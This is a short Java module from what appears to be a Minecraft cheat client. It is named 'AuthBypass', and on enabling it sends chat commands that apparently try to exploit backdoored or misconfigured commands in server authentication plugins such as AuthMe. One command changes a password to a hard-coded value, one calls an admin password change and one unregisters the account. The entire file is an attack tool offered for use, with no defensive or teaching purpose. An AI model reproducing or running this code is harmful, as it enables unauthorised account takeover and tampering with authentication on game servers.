package thefellas.safepoint.modules.misc;

import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import thefellas.safepoint.initializers.NotificationManager;
import thefellas.safepoint.modules.Module;
import thefellas.safepoint.modules.ModuleInfo;

@ModuleInfo(name = "AuthBypass", description = "Bypasses the authentication screen", category = Module.Category.Misc)
public class AuthBypass extends Module {
    @Override
    public void onEnable() {
        super.onEnable();
        NotificationManager.sendMessage("Note","Trying to bypass AuthMe UwU");
        mc.player.sendChatMessage("/xlogin changuepassword AcidUwU321 AcidUwU321");
        mc.player.sendChatMessage("/pswadminchange");
        mc.player.sendChatMessage("/cp unregister");
    }
}
